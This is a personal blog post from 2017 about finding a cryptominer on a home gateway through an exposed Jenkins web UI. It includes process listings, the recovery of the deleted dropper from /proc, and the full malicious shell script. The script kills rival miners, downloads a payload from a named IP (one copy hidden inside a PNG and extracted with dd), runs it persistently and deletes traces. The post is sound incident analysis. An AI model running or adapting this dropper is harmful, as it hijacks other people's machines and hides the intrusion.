Date: 2017-07-18 07:44
Category: Technical
Title: My Jenkins was hacked
Tags: mining, hack, jenkins

The story is about infecting poor Atom-based gateway host with mining software through Jenkins web UI.

Couple of days ago I noticed strange noise from my home gateway fans. The reason was all the 8 cores were 100% loaded with processes named `irq` and `irqbalanc1`.

First, I just checked the source and decided that those processes were spawned by some Jenkins job. Sadly I got no time to investigate, so 8 hours later host was infested again, but I didn't knew it yet.

Days later I finished my real life stuff and remembered about strange load. Then I went to check the logs, temperature graph, etc. Later I would know that my Jenkins web UI was exposed to the internet to let GitHub hooks start jobs and host got infested using this interface. As for now, I just fixed docker-related iptables rules to restrict access.

And here comes the interesting part, see the investigation:

```
$ ps auxfww
root      1972  0.1  0.1 782452 56964 ?        Ssl  Jul04  26:19 /usr/bin/dockerd -H fd://
root      2265  0.0  0.0 754852 13808 ?        Ssl  Jul04  15:42  \_ containerd -l unix:///var/run/docker/libcontainerd/docker-containerd.sock --shim containerd-shim --metrics-interval=0 --start-timeout 2m --state-dir /var/run/docker/libcontainerd/containerd --runtime runc
root      1431  0.0  0.0 356400  7964 ?        Sl   Jul16   0:00  |   \_ containerd-shim 771988ba8b73832a368d250397934b13503b5fc9c220d7707fb488e17e81ad5f /var/run/docker/libcontainerd/771988ba8b73832a368d250397934b13503b5fc9c220d7707fb488e17e81ad5f runc
user      1451  0.0  0.0   1104     4 ?        Ss   Jul16   0:05  |       \_ /bin/tini -- /usr/local/bin/jenkins.sh
user      1475  0.1  9.3 14247684 3065036 ?    Sl   Jul16   5:57  |           \_ java -jar /usr/share/jenkins/jenkins.war
user       888  0.0  0.0   4332  1548 ?        S    Jul16   0:05  |               \_ /bin/sh /tmp/irq
user     19520  0.0  0.0  12816   980 ?        S    Jul16   0:00  |               |   \_ grep -v grep
user     29026  0.0  0.0   4332  1576 ?        S    Jul16   0:05  |               \_ /bin/sh /tmp/irq
user     29158  691  0.0 677948 20696 ?        Sl   Jul16 14660:11  |                   \_ /var/tmp/irqbalanc1 -c /var/tmp/httpd.conf
```

Of course, file was deleted after execution, so here i restore it from RAM:

```
lsof -p 29026
cp /proc/29026/fd/10 ~/fraud.sh
cat ~/fraud.sh
```

See it's getting files from IP 185.162.10.190 (hosting company already got abuse ticket) and extracting code form those via dd using specific offset. Kinda smart.

```
#!/bin/sh
pkill -f apaceha
pkill -f cryptonight
ps ax|grep tmp|grep irqa|grep -v grep|awk '{print $1}'|xargs ps --ppid|awk '{print $1}'|grep -v PID|xargs kill -9
ps ax|grep tmp|grep irqa|grep -v grep|awk '{print $1}'|xargs kill -9
ps -u jenkins|grep sh|grep -v irq|grep -v jenkins|grep -v grep|awk '{print $1}'|xargs kill -9
#ps ax|grep httpd.conf|grep -v irq|grep -v grep|grep tmp|awk '{print $1}'|xargs kill -9
ps -ef|grep .sh|grep tmp|grep -v irq|grep -v grep|grep -v gosh|cut -c 9-15|xargs kill -9
pkill -f stratum
pkill -f mixnerdx
pkill -f performedl
# ... tons of various pkill calls here ...
ps -ef|grep '.so'|grep -v grep|cut -c 9-15|xargs kill -9;
rm -rf /tmp/httpd.conf
rm -rf /tmp/conn
rm -rf /tmp/conns
rm -f /tmp/irq.sh
rm -f /tmp/irqbalanc1

ps auxf|grep -v grep|grep "irqbalanc1"|grep defunct|awk '{print $2}'|xargs kill -9

sleepTime=20

ps -fe|grep irqbalanc1 |grep -v defunct|grep -v grep
if [ $? -ne 0 ]
    then
    echo "start process....."

    cat /proc/cpuinfo|grep aes>/dev/null
    if [ $? -ne 1 ]
        then
        wget 185.162.10.190/miu1.png -O /tmp/conn
        dd if=/tmp/conn skip=7664 bs=1 of=/tmp/irqbalanc1
    else
        wget -O /tmp/irqbalanc1 http://185.162.10.190/kworker_na
    fi

    chmod +x /tmp/irqbalanc1
    wget -O /tmp/httpd.conf http://185.162.10.190/httpd.conf
    nohup /tmp/irqbalanc1  -c /tmp/httpd.conf>/dev/null 2>&1 &
    sleep 5
    rm -rf /tmp/httpd.conf
    rm -rf /tmp/conn
    rm -rf /tmp/conns
    rm -f /tmp/irq.sh
    rm -f /tmp/irq
    rm -f /tmp/irqbalanc1
    while [ 0 -lt 1 ]
    do
        ps -fe| grep irqbalanc1 |grep -v defunct| grep -v grep
        if [ $? -ne 0 ]
            then
            echo "process not exists ,restart process now... "
            cat /proc/cpuinfo|grep aes>/dev/null
            if [ $? -ne 1 ]
                then
                wget 185.162.10.190/miu1.png -O /tmp/conn
                dd if=/tmp/conn skip=7664 bs=1 of=/tmp/irqbalanc1
            else
                wget -O /tmp/irqbalanc1 http://185.162.10.190/kworker_na
            fi

            chmod +x /tmp/irqbalanc1
            wget -O /tmp/httpd.conf http://185.162.10.190/httpd.conf
            nohup /tmp/irqbalanc1  -c /tmp/httpd.conf>/dev/null 2>&1 &
            sleep 5
            rm -rf /tmp/httpd.conf
            rm -rf /tmp/conn
            rm -rf /tmp/conns
            rm -f /tmp/irq.sh
            rm -f /tmp/irq
            rm -f /tmp/irqbalanc1
            echo "restart done ..... "
        else
            echo "process exists , sleep $sleepTime seconds "
            pkill -f cryptonight
            pkill -f apaceha
            pkill -f mixnerdx
            pkill -f performedl
            # ... tons of various pkill calls here ...
            ps -ef|grep '.so'|grep -v grep|cut -c 9-15|xargs kill -9;

        fi
        sleep $sleepTime
    done


else
    echo "runing....."
```

Then script connects to 139.60.160.248 (it is located in `httpd.conf`) and do stuff, using your CPU. I'm also sending abuse to this company to just let them know someone is playing dirty out there. Not sure if they could block this particular IP or something.

I also thoght that it is possible to find wallet accepting address within binary file (as there is no such in config file), but got no luck. Probably it could be located inside `/proc/*/cmdline` or around, but now it's too late as the process was killed.

Please let me know if you got ideas how to continue investigation.

Update: 24 hours after my abuse, header malware host was locked by it's hosting provider. Hoorray!
